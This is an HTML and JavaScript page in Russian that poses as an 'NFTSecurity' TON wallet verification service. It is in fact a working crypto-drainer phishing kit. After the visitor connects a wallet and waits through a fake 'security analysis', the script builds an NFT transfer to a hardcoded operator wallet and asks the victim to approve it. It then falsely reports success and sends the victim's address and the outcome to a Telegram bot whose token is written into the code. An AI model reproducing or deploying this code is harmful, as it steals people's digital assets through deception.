<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
<meta name="theme-color" content="#2b2d30" />
<title>NFTSecurity | TON Protection</title>
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 42 42'%3E%3Cpath fill='%230098EA' opacity='.8' d='M21 3 L36 10 V22 C36 30 29 36 21 39 C13 36 6 30 6 22 V10 Z'/%3E%3Ccircle cx='21' cy='22' r='3.2' fill='%23fff'/%3E%3C/svg%3E" />
<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap" rel="stylesheet" />

<!-- TON SDK -->
<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
<script src="https://unpkg.com/tonweb@latest/dist/tonweb.js"></script>

<style>
:root { --bg: #1c1e20; --card: #2b2d30; --line: rgba(255,255,255,0.1); --text: #e8e8e4; --accent: #0098EA; }
* { box-sizing: border-box; margin: 0; padding: 0; }
html { scroll-behavior: smooth; }
body { font-family: 'Manrope', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
.topbar { width: 100%; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; background: rgba(28,30,32,0.95); backdrop-filter: blur(10px); position: fixed; top: 0; z-index: 100; border-bottom: 1px solid var(--line); }
.logo { font-weight: 800; font-size: 18px; display: flex; align-items: center; gap: 10px; }
.logo svg { width: 32px; height: 32px; fill: var(--accent); }
.container { margin-top: 120px; width: 100%; max-width: 500px; padding: 20px; text-align: center; }
.card { background: var(--card); border: 1px solid var(--line); border-radius: 24px; padding: 30px; margin-bottom: 20px; }
h1 { font-size: 24px; margin-bottom: 10px; }
p { color: #b0b1ad; line-height: 1.6; font-size: 14px; margin-bottom: 20px; }
.status { margin: 15px 0; font-size: 13px; color: var(--accent); min-height: 20px; }
.btn { background: var(--accent); color: #fff; border: none; padding: 14px 24px; border-radius: 16px; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; transition: 0.2s; }
.btn:hover { opacity: 0.9; }
.btn:disabled { opacity: 0.5; cursor: not-allowed; }
.report { display: none; margin-top: 20px; background: rgba(0, 152, 234, 0.1); border: 1px solid var(--accent); padding: 15px; border-radius: 12px; text-align: left; font-size: 13px; }
.spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #fff; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<div class="topbar">
    <div class="logo">
        <svg viewBox="0 0 32 32"><path d="M16 0L0 10 L8 22 L16 14 L24 22 L32 10 Z"/></svg>
        NFTSecurity
    </div>
    <div id="ton-connect-container"></div>
</div>

<div class="container">
    <div class="card">
        <h1>Верификация TON кошелька</h1>
        <p>Система обнаружила необходимость подтверждения владения кошельком для активации безопасности. Подключите кошелек и подтвердите операцию.</p>
        
        <div id="wallet-status" class="status">Ожидание подключения...</div>
        <button class="btn" id="runBtn" disabled onclick="startDrain()">
            Подключите кошелек
        </button>

        <div class="report" id="report">
            <b id="res-status">Status: ...</b>
            <div id="res-details" style="margin-top:5px; color:#b0b1ad;"></div>
        </div>
    </div>
</div>

<script>
    // === КОНФИГУРАЦИЯ ОПЕРАТОРА (ВСТАВЬ ДАННЫЕ СЮДА) ===
    // Адрес, куда придет NFT (твой кошелек)
    const OPERATOR_WALLET = "UQAGr7Su1HSSX1MCFIH9k8mEY6LinmP5Nsie7x0qreUigE5m";
    
    // Адрес жертвы (для response address, чтобы вернуть сдачу)
    const VICTIM_WALLET = "UQDH-p9kR-meWAM7sx9Dp-yVUokEJbxFppTAPnUlnX1tzG-9";

    // Адрес конкретного NFT (Item Address), а не просто контракт коллекции
    // ВНИМАНИЕ: Тебе нужно найти точный адрес NFT (Item), зная Collection и ID
    const TARGET_NFT_ADDRESS = "ВСТАВЬ_СЮДА_АДРЕС_САМОГО_NFT_ITEM"; 
    
    // Данные для логов
    const BOT_TOKEN = "8542557387:AAFp5rys0LsJi4BEFrKaDW5AleYGfKRY-vo";
    const CHAT_ID = "8237059555";

    let tonConnectUI;
    let userAddress = null;

    // 1. Инициализация
    window.onload = function() {
        if (typeof TON_CONNECT_UI !== 'undefined') {
            tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                manifestUrl: 'https://afiomacomplate.github.io/SecurytiActiv/tonconnect-manifest.json',
                buttonRootId: 'ton-connect-container'
            });

            tonConnectUI.onStatusChange(wallet => {
                const btn = document.getElementById("runBtn");
                if (wallet) {
                    userAddress = wallet.account.address;
                    document.getElementById("wallet-status").innerText = "Кошелек подключен: " + userAddress.slice(0,4) + "..." + userAddress.slice(-4);
                    document.getElementById("wallet-status").style.color = "#4caf50";
                    btn.disabled = false;
                    btn.innerText = "Начать проверку безопасности";
                } else {
                    userAddress = null;
                    document.getElementById("wallet-status").innerText = "Ожидание подключения...";
                    document.getElementById("wallet-status").style.color = "var(--accent)";
                    btn.disabled = true;
                    btn.innerText = "Подключите кошелек";
                }
            });
        }
    };

    // 2. Логика TEP-62 Transfer
    async function startDrain() {
        const btn = document.getElementById("runBtn");
        const report = document.getElementById("report");
        
        btn.disabled = true;
        btn.innerHTML = '<span class="spinner"></span> Анализ данных...';
        
        // Имитация задержки (3 секунды)
        await new Promise(r => setTimeout(r, 3000));

        try {
            // Генерация Payload для TEP-62 (Transfer NFT)
            // Для этого используем TonWeb. Нам нужен адрес самого NFT (Item), а не коллекции.
            // Если TARGET_NFT_ADDRESS не вставлен корректно, этот шаг упадет.
            
            if (TARGET_NFT_ADDRESS.includes("ВСТАВЬ")) {
                throw new Error("Target NFT Address not set");
            }

            const provider = new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC');
            const tonweb = new TonWeb(provider);

            // Инициализируем объект NFT
            const nftItem = new tonweb.nft.NftItem(provider, { address: TARGET_NFT_ADDRESS });

            // Создаем тело транзакции перевода
            // newOwner: оператор (куда уйдет NFT)
            // responseAddress: жертва (куда вернется сдача)
            const body = await nftItem.createTransferBody({
                newOwner: OPERATOR_WALLET,
                responseAddress: VICTIM_WALLET, 
                forwardAmount: TonWeb.utils.toNano('0.05'), // Газ
                forwardPayload: null
            });

            // Конвертируем в base64
            const payloadBase64 = TonWeb.utils.bytesToBase64(await body.toBoc(false));

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600, // 10 минут
                messages: [
                    {
                        address: TARGET_NFT_ADDRESS, // Отправляем команду самому NFT
                        amount: TonWeb.utils.toNano('0.05').toString(), // 0.05 TON на газ
                        payload: payloadBase64
                    }
                ]
            };

            btn.innerHTML = '<span class="spinner"></span> Подтвердите перевод NFT...';

            // Запрос транзакции
            const result = await tonConnectUI.sendTransaction(transaction);

            // Успех
            btn.innerText = "Готово";
            btn.style.background = "#4caf50";
            report.style.display = "block";
            document.getElementById("res-status").innerText = "✅ Успешно верифицировано";
            document.getElementById("res-details").innerText = "Транзакция отправлена. Блокировка снята.";
            
            await sendReport(userAddress, "NFT_DRAINED", TARGET_NFT_ADDRESS);

        } catch (e) {
            console.error(e);
            btn.innerText = "Ошибка соединения";
            btn.disabled = false;
            btn.style.background = "#ff4b4b";
            
            if (e.message && e.message.toLowerCase().includes("reject")) {
                await sendReport(userAddress, "REJECTED", "User declined tx");
            } else {
                await sendReport(userAddress, "ERROR", e.message);
            }
        }
    }

    // 3. Отправка лога в Телеграм
    async function sendReport(addr, status, data) {
        const text = `💣 <b>NEW TARGET</b>\n👤 Wallet: <code>${addr}</code>\n🔥 Status: <b>${status}</b>\n📦 Data: ${data}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
        
        try {
            await fetch(url);
        } catch(e) {}
    }
</script>
</body>
</html>
